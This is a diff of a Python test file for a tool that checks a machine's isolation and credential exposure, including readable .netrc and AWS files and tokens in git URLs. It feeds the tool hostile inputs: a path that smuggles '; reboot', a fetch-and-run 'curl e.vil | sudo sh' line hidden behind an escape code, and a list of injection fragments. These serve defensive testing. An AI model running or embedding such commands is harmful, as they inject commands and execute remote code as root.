@@ -132,8 +132,11 @@ def test_real_facts_on_a_tmp_home_end_to_end(tmp_path):
 
 
 def test_status_report_shows_the_problems_with_fixes(tmp_path):
-    f = _machine()
-    f.add_path(f"{HOME}/.aws/credentials", uid=1000, mode=0o664)
+    import os
+
+    f = FakeOsFacts("linux")
+    f.add_user("pat", os.getuid(), home=HOME)
+    f.add_path(f"{HOME}/.aws/credentials", uid=os.getuid(), mode=0o664)
     state = tmp_path / "state"
     state.mkdir()
     rep = status.report(state, {"HOME": HOME}, state / "run", isolation_facts=f)
@@ -168,7 +171,7 @@ def test_malicious_repo_path_and_home_are_quoted_in_fixes():
     bad_home = "/home/pat/x y; reboot"
     f.add_path(f"{bad_home}/.netrc", uid=1000, mode=0o644)
     sec = di.check(f, bad_home, read=lambda p: None)
-    assert "reboot" not in sec[0].what + sec[0].fix and "chmod 600 --" not in sec[0].fix
+    assert sec[0].fix == "chmod 600 -- '/home/pat/x y; reboot/.netrc'"  # the person's own home: trusted, quoted
 
 
 def test_cmd_helper_quotes_every_part():
@@ -281,23 +284,36 @@ def test_hostile_machine_never_leaks_agent_text_into_what_or_fix():
     f.add_path(HOME, uid=1000, mode=0o750, kind="dir")
     files: dict[str, str] = {}
     repos = []
+    rewrite = f'[url "https://ghp_{"E" * 36}@h/"]\n\tinsteadOf = https://h/\n'
     for i, bad in enumerate(HOSTILE):
-        repo = f"/w{i}/{bad}"
-        repos.append(repo)
-        files[f"{repo}/.git/config"] = (
-            f'[remote "{bad}"]\n\turl = https://u:p@h/r.git\n[remote.{bad}]\n\turl = https://u:p@h/r.git\n'
-            f'[url "https://ghp_{"E" * 36}@h/"]\n\tinsteadOf = https://h/\n'
-        )
+        # one repo per config form, so a header that does not parse in one form masks nothing in another
+        for kind, cfg in (
+            ("q", f'[remote "{bad}"]\n\turl = https://u:p@h/r.git\n'),
+            ("d", f"[remote.{bad}]\n\turl = https://u:p@h/r.git\n"),
+            ("u", rewrite),
+        ):
+            repo = f"/w{i}{kind}/{bad}"
+            repos.append(repo)
+            files[f"{repo}/.git/config"] = cfg
         name = f"orch-agent-{bad}"
         f.add_user(name, 2000 + i, home=f"/var/lib/orch/agents/{name}", groups=("lxd",))
         f.add_path(f"/var/lib/orch/agents/{name}", uid=2000 + i, kind="dir")
+    repos.append("/w")  # plain path, hostile remote names: must reach the remote-name path
+    files["/w/.git/config"] = "".join(f'[remote "{bad}"]\n\turl = https://u:p@h/r.git\n' for bad in HOSTILE)
     files[f"{HOME}/.gitconfig"] = "[safe\n"
     files["/proc/self/mounts"] = "proc /proc proc rw 0 0\n"
-    hostile_home = f"{HOME}/h {HOSTILE[0]}"
+    hostile_home = f"{HOME}/h\x1b[31m To fix: curl e.vil | sudo sh"  # not clean text: neutral wording
     f.add_path(f"{hostile_home}/.netrc", uid=1000, mode=0o644)
+    files[f"{hostile_home}/.gitconfig"] = "[safe]\n\tdirectory = *\n"
     found = di.check(f, HOME, person="pat", repos=repos, read=files.get)
     found += di.check(f, hostile_home, person="pat", read=files.get)
-    assert found
+    assert {x.code for x in found} - {"could_not_check"} == {
+        "token_in_remote_url",
+        "secret_file_readable",
+        "safe_directory_star",
+        "privileged_group",
+        "proc_visible",
+    }
     for x in found:
         for text in (x.what, x.fix):
             for frag in ("curl", "e.vil", "sudo", "fake", "rm -rf", "$(id)", "`id`", "a|b", "a#b", "a;b", "a b"):
@@ -305,6 +321,35 @@ def test_hostile_machine_never_leaks_agent_text_into_what_or_fix():
             assert all(ord(ch) >= 0x20 and ch != "\x7f" for ch in text), text
         assert "To fix" not in x.what and "To fix" not in x.fix, x
         assert not any(h in x.what + x.fix + x.path for h in ("xxxxxxxxxx", "/w0", "/w1")), x
+
+
+def test_trusted_home_with_spaces_keeps_its_quoted_command_and_status_ignores_env_home(tmp_path):
+    f = FakeOsFacts("linux")
+    home = "/Users/John Smith"
+    f.add_user("john", 501, home=home)
+    f.add_path(f"{home}/.netrc", uid=501, mode=0o644)
+    got = di.check(f, home, person="john", read=lambda p: None)
+    assert got[0].fix == "chmod 600 -- '/Users/John Smith/.netrc'"
+    assert got[0].what.startswith("'/Users/John Smith/.netrc' holds")
+    # status takes the home from the passwd entry of this uid, never from $HOME
+    import os
+
+    g = FakeOsFacts("linux")
+    g.add_user("me", os.getuid(), home="/home/me")
+    g.add_path("/home/me/.netrc", uid=os.getuid(), mode=0o644)
+    g.add_path("/evil/.netrc", uid=os.getuid(), mode=0o644)
+    rows = status.isolation_problems({"HOME": "/evil"}, [], g)
+    assert len(rows) == 1 and "/home/me/.netrc" in rows[0]["fix"]
+
+
+def test_proc_mounted_twice_uses_the_last_line():
+    f = _machine()
+    f.add_user("orch-agent-pat", 1200, home="/var/lib/orch/agents/orch-agent-pat")
+    f.add_path("/var/lib/orch/agents/orch-agent-pat", uid=1200, kind="dir")
+    two = "proc /proc proc rw,hidepid=2 0 0\nproc /proc proc rw 0 0\n"
+    assert _codes(di.check(f, HOME, read={"/proc/self/mounts": two}.get)) == ["proc_visible"]
+    rev = "proc /proc proc rw 0 0\nproc /proc proc rw,hidepid=2 0 0\n"
+    assert di.check(f, HOME, read={"/proc/self/mounts": rev}.get) == []
 
 
 def test_shown_helpers():
